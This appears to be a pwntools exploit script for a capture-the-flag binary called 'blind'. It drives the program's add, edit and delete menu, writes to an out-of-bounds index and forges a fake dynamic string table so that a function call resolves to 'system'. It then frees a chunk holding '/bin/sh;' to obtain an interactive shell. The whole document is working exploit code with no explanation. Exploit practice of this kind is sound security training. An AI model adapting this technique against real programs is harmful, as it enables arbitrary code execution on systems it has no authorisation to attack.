from pwn import *
context.arch = 'amd64'
elf = ELF('blind')
r = process('./blind')

def add(idx,name):
    assert len(name)<=0x80 and idx<=9
    r.sendlineafter('>','1')
    r.sendlineafter('index:',str(idx))
    if(len(name)==0x80):
        r.sendafter('name:',name)
    else:
        r.sendlineafter('name:',name)

def edit(idx,name):
    assert len(name)<=0x100 and idx<=9
    r.sendlineafter('>','3')
    r.sendlineafter('index:',str(idx))
    if(len(name)==0x100):
        r.sendafter('name:',name)
    else:
        r.sendlineafter('name:',name)

def dele(idx):
    assert idx<=9
    r.sendlineafter('>','2')
    r.sendlineafter('index:',str(idx))

fake_DY_STRTAB = "\x00libc.so.6\x00exit\x00signal\x00puts\x00__stack_chk_fail\x00putchar\x00printf\x00read\x00stdout\x00malloc\x00alarm\x00atoi\x00close\x00setbuf\x00__libc_start_main\x00"
fake_DY_STRTAB += 'system\x00'

fake_idx = (0x6010a0-0x6012c0)/8
add(0,"/bin/sh;")
add(fake_idx,"\x00")
add(1,'\x00')
edit(fake_idx,fake_DY_STRTAB)
dele(0)
r.interactive()
